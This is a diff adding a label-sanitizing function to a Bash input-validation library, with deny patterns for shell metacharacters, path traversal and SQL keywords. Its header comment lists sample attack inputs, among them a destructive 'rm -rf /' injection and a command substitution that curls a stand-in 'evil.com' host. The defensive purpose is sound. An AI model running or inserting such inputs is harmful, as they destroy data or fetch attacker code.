@@ -290,6 +290,79 @@ validate_port() {
   return 0
 }
 
+# Sanitize container label for Docker API
+# Purpose: Prevent label injection attacks (CVSS 7.5)
+# Usage: sanitize_label <label_value>
+# Returns: Sanitized label or exits with error if invalid
+# Example: SAFE_LABEL=$(sanitize_label "$USER_INPUT")
+#
+# Security Requirements:
+# - Alphanumeric, hyphen, underscore only
+# - Maximum 63 characters (Kubernetes label limit)
+# - No leading/trailing hyphens
+# - No shell metacharacters
+# - No path traversal sequences
+# - No command substitution
+# - No SQL injection patterns
+#
+# Attack Vectors Blocked:
+# - Shell injection: '; rm -rf /;'
+# - SQL injection: ' OR 1=1--
+# - Command substitution: $(curl evil.com)
+# - Path traversal: ../../etc/passwd
+sanitize_label() {
+  local label=$1
+
+  # Check for empty input
+  if [[ -z "$label" ]]; then
+    val_error "Label cannot be empty"
+    return 1
+  fi
+
+  # Trim leading and trailing whitespace
+  label="${label#"${label%%[![:space:]]*}"}"
+  label="${label%"${label##*[![:space:]]}"}"
+
+  # Check length (Kubernetes DNS label limit: 63 chars)
+  if [[ ${#label} -gt 63 ]]; then
+    val_error "Label exceeds maximum length: ${#label} chars (max: 63)"
+    return 1
+  fi
+
+  # Validate format: alphanumeric, hyphen, underscore only
+  # Pattern: starts with alphanumeric, contains alphanumeric/hyphen/underscore, ends with alphanumeric
+  if [[ ! "$label" =~ ^[a-z0-9][a-z0-9_-]*[a-z0-9]$ ]] && [[ ! "$label" =~ ^[a-z0-9]$ ]]; then
+    val_error "Label contains invalid characters: '$label'"
+    val_error "  Allowed: lowercase letters, numbers, hyphen, underscore"
+    val_error "  Pattern: must start and end with alphanumeric"
+    return 1
+  fi
+
+  # Additional security checks for dangerous patterns
+
+  # Block path traversal sequences
+  if [[ "$label" =~ \.\.|/|\\  ]]; then
+    val_error "Label contains path traversal sequences: '$label'"
+    return 1
+  fi
+
+  # Block shell metacharacters
+  if [[ "$label" =~ [\;\|\&\$\`\(\)\{\}\[\]\<\>\'\"] ]]; then
+    val_error "Label contains shell metacharacters: '$label'"
+    return 1
+  fi
+
+  # Block SQL injection patterns
+  if [[ "$label" =~ (DROP|SELECT|INSERT|UPDATE|DELETE|UNION|WHERE|OR\ 1=1|--|\'|--) ]]; then
+    val_error "Label contains SQL injection pattern: '$label'"
+    return 1
+  fi
+
+  # Label is valid and sanitized
+  echo "$label"
+  return 0
+}
+
 # Export functions for use in other scripts
 export -f validate_numeric
 export -f validate_path
@@ -300,9 +373,10 @@ export -f verify_checksum
 export -f sanitize_filename
 export -f validate_url
 export -f validate_port
+export -f sanitize_label
 export -f val_error
 export -f val_warn
 export -f val_info
 
 # Library loaded successfully
-val_info "Shell validation framework loaded (v1.0.0)"
+val_info "Shell validation framework loaded (v1.1.0 - label sanitization added)"
